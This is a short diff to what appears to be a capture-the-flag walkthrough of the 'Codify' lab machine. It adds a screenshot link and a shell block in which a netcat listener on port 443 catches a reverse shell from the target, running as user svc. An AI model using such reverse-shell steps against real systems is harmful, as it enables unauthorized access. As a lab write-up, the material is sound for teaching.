@@ -106,4 +106,15 @@ We copy the payload, paste it into the console and successfully execute a comman
 
 <br />
 
+![7](../../../assets/images/Codify/7.png)
 
+<br />
+
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.11.239] 58142
+uid=1001(svc) gid=1001(svc) groups=1001(svc)
+```
+
+<br />
